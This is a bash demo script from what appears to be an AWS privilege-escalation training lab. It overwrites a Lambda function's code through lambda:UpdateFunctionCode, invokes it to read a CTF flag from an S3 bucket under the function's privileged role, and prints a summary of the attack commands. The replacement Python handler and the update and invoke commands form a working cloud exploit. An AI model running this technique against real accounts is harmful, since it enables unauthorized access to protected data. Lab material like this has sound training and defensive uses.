#!/bin/bash

# Demo script for lambda:UpdateFunctionCode to S3 bucket access
# This scenario demonstrates how a user with lambda:UpdateFunctionCode can modify existing Lambda
# function code to execute malicious logic under the function's privileged role and read a
# sensitive S3 bucket the attacker cannot directly access.


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-lambda-003-to-bucket-starting-user"
TARGET_LAMBDA="pl-prod-lambda-003-to-bucket-target-lambda"
TARGET_ROLE="pl-prod-lambda-003-to-bucket-target-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Lambda UpdateFunctionCode to S3 Bucket Access Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_lambda_003_lambda_updatefunctioncode.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
TARGET_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

if [ "$TARGET_BUCKET" == "null" ] || [ -z "$TARGET_BUCKET" ]; then
    echo -e "${RED}Error: Could not extract target bucket name from terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Target bucket: $TARGET_BUCKET"
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"

echo "Using region: $AWS_REGION"

show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have bucket access yet
echo -e "${YELLOW}Step 4: Verifying we don't have S3 bucket access yet${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"
echo "Attempting to access target bucket (should fail)..."
show_cmd "Attacker" "aws s3 ls s3://$TARGET_BUCKET/"
if aws s3 ls s3://$TARGET_BUCKET/ &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access s3://$TARGET_BUCKET/ (as expected)${NC}"
fi
echo ""

# [OBSERVATION] Step 5: Get target Lambda function details
echo -e "${YELLOW}Step 5: Getting target Lambda function details${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"
echo "Target Lambda function: $TARGET_LAMBDA"

show_cmd "ReadOnly" "aws lambda get-function --region $AWS_REGION --function-name $TARGET_LAMBDA --output json"
FUNCTION_INFO=$(aws lambda get-function \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --output json 2>/dev/null)

if [ $? -ne 0 ]; then
    echo -e "${RED}Error: Could not get Lambda function details${NC}"
    exit 1
fi

# Extract handler name and role — CRITICAL: filename must match the handler module name
HANDLER_NAME=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Handler')
FUNCTION_ROLE=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Role')
RUNTIME=$(echo "$FUNCTION_INFO" | jq -r '.Configuration.Runtime')

echo "Handler: $HANDLER_NAME"
echo "Runtime: $RUNTIME"
echo "Execution Role: $FUNCTION_ROLE"
echo -e "${GREEN}✓ Retrieved function details${NC}\n"

# Step 6: Backup original Lambda function code
echo -e "${YELLOW}Step 6: Backing up original Lambda function code${NC}"
echo "Downloading original code for restoration after demo..."

# Get the presigned code location URL from the function info
CODE_LOCATION=$(echo "$FUNCTION_INFO" | jq -r '.Code.Location')

curl -s "$CODE_LOCATION" -o /tmp/original_lambda_backup.zip

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Original code backed up to /tmp/original_lambda_backup.zip${NC}"
else
    echo -e "${RED}Error: Could not backup original code${NC}"
    exit 1
fi
echo ""

# Step 7: Create malicious Lambda function code
echo -e "${YELLOW}Step 7: Creating malicious Lambda function code${NC}"
echo "Creating Python code that will read flag.txt from the target S3 bucket..."

# CRITICAL: Filename must match the handler module name.
# Handler is "lambda_function.lambda_handler" so file must be "lambda_function.py"
cat > /tmp/lambda_function.py << EOF
import json
import boto3
import os

def lambda_handler(event, context):
    """
    Malicious Lambda function that reads flag.txt from the target S3 bucket.
    This function runs with the privileged execution role attached to the Lambda,
    which has s3:GetObject on the target bucket that the starting user cannot access.
    """
    s3 = boto3.client('s3')
    # Bucket name is injected via the TARGET_BUCKET environment variable set
    # by lambda:UpdateFunctionConfiguration, or falls back to the event payload.
    bucket = os.environ.get('TARGET_BUCKET', event.get('bucket', ''))

    try:
        obj = s3.get_object(Bucket=bucket, Key='flag.txt')
        flag = obj['Body'].read().decode('utf-8')

        message = f'Successfully read sensitive S3 bucket: {bucket}'
        print(message)

        return {
            'statusCode': 200,
            'body': json.dumps({
                'flag': flag,
                'message': message,
                'bucket': bucket
            })
        }
    except Exception as e:
        error_message = f'Error reading S3 object: {str(e)}'
        print(error_message)
        return {
            'statusCode': 500,
            'body': json.dumps({
                'success': False,
                'error': error_message
            })
        }
EOF

echo -e "${GREEN}✓ Malicious code created${NC}\n"

# Step 8: Package the malicious code
echo -e "${YELLOW}Step 8: Packaging malicious code${NC}"
cd /tmp
zip -q lambda_function.zip lambda_function.py
cd - > /dev/null

if [ -f /tmp/lambda_function.zip ]; then
    echo -e "${GREEN}✓ Malicious code packaged${NC}"
else
    echo -e "${RED}Error: Failed to create zip file${NC}"
    rm -f /tmp/lambda_function.py
    exit 1
fi
echo ""

# [EXPLOIT] Step 9: Update Lambda function code (PRIVILEGE ESCALATION)
echo -e "${YELLOW}Step 9: Updating Lambda function code with malicious payload${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"
echo "This is the privilege escalation vector - updating function code..."
echo "Function: $TARGET_LAMBDA"

show_attack_cmd "Attacker" "aws lambda update-function-code --region $AWS_REGION --function-name $TARGET_LAMBDA --zip-file fileb:///tmp/lambda_function.zip --output json"
UPDATE_RESULT=$(aws lambda update-function-code \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --zip-file fileb:///tmp/lambda_function.zip \
    --output json 2>&1)

if [ $? -eq 0 ]; then
    LAST_UPDATE_STATUS=$(echo "$UPDATE_RESULT" | jq -r '.LastUpdateStatus')
    echo "Update Status: $LAST_UPDATE_STATUS"
    echo -e "${GREEN}✓ Successfully updated Lambda function code!${NC}"
else
    echo -e "${RED}Error: Failed to update Lambda function code${NC}"
    echo "$UPDATE_RESULT"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip
    exit 1
fi
echo ""

# Step 10: Wait for Lambda code update to reach Successful state before invoking.
# Using readonly creds because lambda:GetFunction is in the "helpful" permission set
# which may be restricted during a validation run — readonly user always has read access.
echo -e "${YELLOW}Step 10: Waiting for Lambda code update to reach Successful state...${NC}"
use_readonly_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"
MAX_WAIT=60
WAITED=0
while [ "$WAITED" -lt "$MAX_WAIT" ]; do
    UPDATE_STATUS=$(aws lambda get-function \
        --region "$AWS_REGION" \
        --function-name "$TARGET_LAMBDA" \
        --query 'Configuration.LastUpdateStatus' \
        --output text 2>/dev/null)
    if [ "$UPDATE_STATUS" = "Successful" ]; then
        echo -e "${GREEN}✓ Lambda code update complete (LastUpdateStatus: Successful)${NC}\n"
        break
    fi
    echo "  LastUpdateStatus: $UPDATE_STATUS — waiting 5s..."
    sleep 5
    WAITED=$((WAITED + 5))
done
if [ "$WAITED" -ge "$MAX_WAIT" ]; then
    echo -e "${YELLOW}Warning: Lambda update did not reach Successful within ${MAX_WAIT}s, proceeding${NC}"
fi

# [EXPLOIT] Step 11: Invoke the malicious Lambda function
echo -e "${YELLOW}Step 11: Invoking Lambda function to read target S3 bucket${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION
export AWS_DEFAULT_REGION="$AWS_REGION"
echo "Invoking function: $TARGET_LAMBDA"

show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/response.json --output json"
aws lambda invoke \
    --region $AWS_REGION \
    --function-name $TARGET_LAMBDA \
    --payload '{}' \
    /tmp/response.json \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Lambda function invoked successfully${NC}"
    echo ""
    echo "Response from Lambda function:"
    cat /tmp/response.json | jq '.'
    echo ""
else
    echo -e "${RED}Error: Failed to invoke Lambda function${NC}"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json /tmp/original_lambda_backup.zip
    exit 1
fi

# Parse the flag out of the response body
FLAG_VALUE=$(cat /tmp/response.json | jq -r '.body' | jq -r '.flag // empty' 2>/dev/null)

if [ -z "$FLAG_VALUE" ]; then
    echo -e "${RED}Error: Could not extract flag from Lambda response${NC}"
    echo "Check /tmp/response.json for details"
    rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json /tmp/original_lambda_backup.zip
    exit 1
fi

echo -e "${GREEN}✓ BUCKET ACCESS CONFIRMED via Lambda execution role${NC}"
echo ""

# Clean up temporary files (keep backup for cleanup script)
rm -f /tmp/lambda_function.py /tmp/lambda_function.zip /tmp/response.json

# [EXPLOIT] Step 12: Capture the CTF flag
# The Lambda function read flag.txt from the target bucket using its execution role.
# The flag value was returned in the Lambda response body — we already have it.
echo -e "${YELLOW}Step 12: Capturing CTF flag from Lambda response${NC}"
show_attack_cmd "Attacker" "aws lambda invoke --region $AWS_REGION --function-name $TARGET_LAMBDA --payload '{}' /tmp/response.json && cat /tmp/response.json | jq -r '.body' | jq -r '.flag'"
echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
echo ""

# Restore helpful permissions before printing summary
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with lambda:UpdateFunctionCode + lambda:InvokeFunction)"
echo "2. Discovered existing Lambda function: $TARGET_LAMBDA"
echo "3. Lambda function has privileged execution role: $TARGET_ROLE"
echo "4. Updated Lambda function code with payload that reads from S3 (bucket injected via env var)"
echo "5. Invoked Lambda function to read flag.txt from s3://$TARGET_BUCKET/"
echo "6. CTF flag extracted from Lambda response: $FLAG_VALUE"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (lambda:UpdateFunctionCode) → $TARGET_LAMBDA"
echo -e "  → (lambda:InvokeFunction) → Executes with $TARGET_ROLE"
echo -e "  → (s3:GetObject flag.txt) → CTF Flag"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- Modified Lambda function: $TARGET_LAMBDA (code replaced with malicious payload)"
echo "- Backup of original code: /tmp/original_lambda_backup.zip"

echo -e "\n${RED}⚠ Warning: The Lambda function code has been modified${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  run plabs cleanup or use the plabs TUI/CLI"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
